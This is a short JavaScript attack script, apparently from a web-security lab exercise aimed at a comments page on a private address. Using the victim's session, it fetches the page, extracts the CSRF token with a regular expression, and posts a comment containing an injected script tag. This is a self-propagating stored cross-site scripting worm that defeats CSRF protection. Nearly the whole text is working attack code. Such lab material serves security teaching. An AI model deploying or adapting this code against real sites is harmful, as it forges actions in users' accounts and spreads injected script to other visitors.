(async function postCommentWorm() {
  // Load the HTML of the comments page using current session
  const response = await fetch("http://10.9.0.90/comments.php", {
    credentials: "include"
  });

  const pageText = await response.text();

  // Find the CSRF token inside the HTML using a regular expression
  const tokenSearch = pageText.match(/name="token256"[^>]*value="([^"]+)"/);
  const csrf = tokenSearch ? tokenSearch[1] : null;

  if (!csrf) {
    alert("Token not found â€” cannot post comment.");
    return;
  }

  // Define the XSS payload to be injected as a new comment
  const xssCode = `<script>alert("ALL YOUR SCRIPT BELONG TO US.")</script>`;

  // Build form data for the POST request
  const data = new URLSearchParams();
  data.append("comment", xssCode);
  data.append("token256", csrf);

  // Submit the new comment with the stolen token
  await fetch("http://10.9.0.90/comments.php", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: data.toString(),
    credentials: "include"
  });
})();
